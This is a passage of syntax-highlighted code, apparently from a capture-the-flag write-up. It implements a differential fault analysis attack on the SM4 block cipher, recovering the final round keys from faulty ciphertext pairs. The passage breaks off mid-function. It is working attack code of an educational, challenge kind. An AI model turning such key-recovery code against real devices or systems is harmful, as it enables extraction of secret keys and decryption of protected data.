class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">get_uint32_be = <span class="keyword">lambda</span> key_data:((key_data[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (key_data[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (key_data[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | (key_data[<span class="number">3</span>]))</span><br><span class="line">put_uint32_be = <span class="keyword">lambda</span> n:[((n&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>), ((n&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>), ((n&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>), ((n)&amp;<span class="number">0xff</span>)]</span><br><span class="line">get_uint128_be = <span class="keyword">lambda</span> key_data:((key_data[<span class="number">0</span>] &lt;&lt; <span class="number">96</span>) | (key_data[<span class="number">1</span>] &lt;&lt; <span class="number">64</span>) | (key_data[<span class="number">2</span>] &lt;&lt; <span class="number">32</span>) | (key_data[<span class="number">3</span>]))</span><br><span class="line">put_uint128_be = <span class="keyword">lambda</span> n:[((n&gt;&gt;<span class="number">96</span>)&amp;<span class="number">0xffffffff</span>), ((n&gt;&gt;<span class="number">64</span>)&amp;<span class="number">0xffffffff</span>), ((n&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>), ((n)&amp;<span class="number">0xffffffff</span>)]</span><br><span class="line">rotl = <span class="keyword">lambda</span> x, n:((x &lt;&lt; n) &amp; <span class="number">0xffffffff</span>) | ((x &gt;&gt; (<span class="number">32</span> - n)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">L = <span class="keyword">lambda</span> y:(y ^^ (rotl(y, <span class="number">2</span>)) ^^ (rotl(y, <span class="number">10</span>)) ^^ (rotl(y, <span class="number">18</span>)) ^^ (rotl(y, <span class="number">24</span>)))</span><br><span class="line"></span><br><span class="line">SM4_FK = [<span class="number">0xa3b1bac6</span>,<span class="number">0x56aa3350</span>,<span class="number">0x677d9197</span>,<span class="number">0xb27022dc</span>]</span><br><span class="line">SM4_CK = [</span><br><span class="line">    <span class="number">0x00070e15</span>,<span class="number">0x1c232a31</span>,<span class="number">0x383f464d</span>,<span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>,<span class="number">0x8c939aa1</span>,<span class="number">0xa8afb6bd</span>,<span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>,<span class="number">0xfc030a11</span>,<span class="number">0x181f262d</span>,<span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>,<span class="number">0x6c737a81</span>,<span class="number">0x888f969d</span>,<span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>,<span class="number">0xdce3eaf1</span>,<span class="number">0xf8ff060d</span>,<span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>,<span class="number">0x4c535a61</span>,<span class="number">0x686f767d</span>,<span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>,<span class="number">0xbcc3cad1</span>,<span class="number">0xd8dfe6ed</span>,<span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>,<span class="number">0x2c333a41</span>,<span class="number">0x484f565d</span>,<span class="number">0x646b7279</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">generate differential dist for SBOX</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">SM4_BOXES_TABLE = [</span><br><span class="line">    <span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,</span><br><span class="line">    <span class="number">0x05</span>,<span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>,<span class="number">0x99</span>,<span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,</span><br><span class="line">    <span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,</span><br><span class="line">    <span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,<span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,</span><br><span class="line">    <span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,<span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,</span><br><span class="line">    <span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,<span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,<span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,<span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,</span><br><span class="line">    <span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,<span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,<span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,</span><br><span class="line">    <span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,<span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,<span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,</span><br><span class="line">    <span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,<span class="number">0x0a</span>,<span class="number">0xc1</span>,</span><br><span class="line">    <span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,<span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0x48</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">diff_dist = dict()</span><br><span class="line"><span class="comment"># initiate dist by set</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        diff_dist[(i, j)] = set()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        pt_diff = i ^^ j</span><br><span class="line">        ct_diff = SM4_BOXES_TABLE[i] ^^ SM4_BOXES_TABLE[j]</span><br><span class="line">        diff_dist[(pt_diff, ct_diff)].add(i)</span><br><span class="line">        diff_dist[(pt_diff, ct_diff)].add(j)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">get data for DFA attack</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">enc_flag, cipher1, cipher2 = <span class="literal">None</span>, [], []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fr:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fr:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            enc_flag = line.strip()</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">1</span> &lt;= i &lt;= <span class="number">10</span>:</span><br><span class="line">            c_data = re.findall(<span class="string">r"\((.*),(.*),(.*)\)"</span>, line)[<span class="number">0</span>]</span><br><span class="line">            ct, ct_ast, ct_diff = c_data[<span class="number">0</span>], c_data[<span class="number">1</span>], c_data[<span class="number">2</span>]</span><br><span class="line">            ct_list = put_uint128_be(int(ct, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            <span class="comment"># ct_ast_list = put_uint128_be(int(ct_ast, 16))[::-1]</span></span><br><span class="line">            ct_diff_list = put_uint128_be(int(ct_diff, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            cipher1.append((get_uint128_be(ct_list), get_uint128_be(ct_diff_list)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c_data = re.findall(<span class="string">r"\((.*),(.*),(.*)\)"</span>, line)[<span class="number">0</span>]</span><br><span class="line">            ct, ct_ast, ct_diff = c_data[<span class="number">0</span>], c_data[<span class="number">1</span>], c_data[<span class="number">2</span>]</span><br><span class="line">            ct_list = put_uint128_be(int(ct, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            ct_ast_list = put_uint128_be(int(ct_ast, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            cipher2.append((get_uint128_be(ct_list), get_uint128_be(ct_ast_list)))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">COEF prepared for function `inv_L`</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">coef_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    cur_coef_list = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    cur_coef_list[i] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">2</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">10</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">18</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">24</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    coef_list.append(cur_coef_list)</span><br><span class="line">COEF = (Matrix(GF(<span class="number">2</span>), coef_list).T).inverse()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_L</span><span class="params">(ct)</span>:</span></span><br><span class="line">    ct = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(ct)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">'0'</span>)]</span><br><span class="line">    C = Matrix(GF(<span class="number">2</span>), ct)</span><br><span class="line">    M = C * COEF</span><br><span class="line">    mt = int(<span class="string">''</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> M[<span class="number">0</span>]), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mt</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">use a round key to decrypt(only one round)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_one_round</span><span class="params">(cipher, rk)</span>:</span></span><br><span class="line">    cipher_list = put_uint128_be(cipher)</span><br><span class="line">    x = put_uint32_be(cipher_list[<span class="number">0</span>] ^^ cipher_list[<span class="number">1</span>] ^^ cipher_list[<span class="number">2</span>] ^^ rk)</span><br><span class="line">    y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        y.append(SM4_BOXES_TABLE[x[i]])</span><br><span class="line">    y = get_uint32_be(y)</span><br><span class="line">    y = L(y)</span><br><span class="line">    new_cipher_list = [y ^^ cipher_list[<span class="number">3</span>], cipher_list[<span class="number">0</span>], cipher_list[<span class="number">1</span>], cipher_list[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> get_uint128_be(new_cipher_list)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_key</span><span class="params">(key, i)</span>:</span></span><br><span class="line">    key1, key2, key3, key4 = key[<span class="number">0</span>], key[<span class="number">1</span>], key[<span class="number">2</span>], key[<span class="number">3</span>]</span><br><span class="line">    k_in = put_uint32_be(key1 ^^ key2 ^^ key3 ^^ SM4_CK[i])</span><br><span class="line">    k_out = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        k_out.append(SM4_BOXES_TABLE[k_in[i]])</span><br><span class="line">    k_out = get_uint32_be(k_out)</span><br><span class="line">    k_out = k_out ^^ (rotl(k_out, <span class="number">13</span>)) ^^ (rotl(k_out, <span class="number">23</span>))</span><br><span class="line">    key0 = key4 ^^ k_out</span><br><span class="line">    <span class="keyword">return</span> key0</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_31</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher1</span><br><span class="line">    key_31 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000022</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_31_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_31_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_31[j] = key_31[j] &amp; key_31_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_31[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000033</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_31_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_31_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_31[j] = key_31[j] &amp; key_31_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_31[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(key_31)</span></span><br><span class="line">    key_31 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_31])</span><br><span class="line">    print(<span class="string">"[+] KEY_31: "</span> + hex(key_31)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_31</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_30</span><span class="params">(key_31)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        cipher1[i] = (dec_one_round(cipher1[i][<span class="number">0</span>], key_31), get_uint128_be([<span class="number">0x00000022</span>] + put_uint128_be(cipher1[i][<span class="number">1</span>])[:<span class="number">3</span>]))</span><br><span class="line">        cipher1[i+<span class="number">5</span>] = (dec_one_round(cipher1[i+<span class="number">5</span>][<span class="number">0</span>], key_31), get_uint128_be([<span class="number">0x00000033</span>] + put_uint128_be(cipher1[i+<span class="number">5</span>][<span class="number">1</span>])[:<span class="number">3</span>]))</span><br><span class="line">    key_30 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_30_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_30_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_30[j] = key_30[j] &amp; key_30_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_30[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_30_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_30_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_30[j] = key_30[j] &amp; key_30_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_30[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(key_30)</span></span><br><span class="line">    key_30 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_30])</span><br><span class="line">    print(<span class="string">"[+] KEY_30: "</span> + hex(key_30)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_30</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_29</span><span class="params">(key_30)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        cipher1[i] = (dec_one_round(cipher1[i][<span class="number">0</span>], key_30), get_uint128_be([<span class="number">0x00000000</span>] + put_uint128_be(cipher1[i][<span class="number">1</span>])[:<span class="number">3</span>]))</span><br><span class="line">    key_29 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_29_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_29_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_29[j] = key_29[j] &amp; key_29_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_29[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = 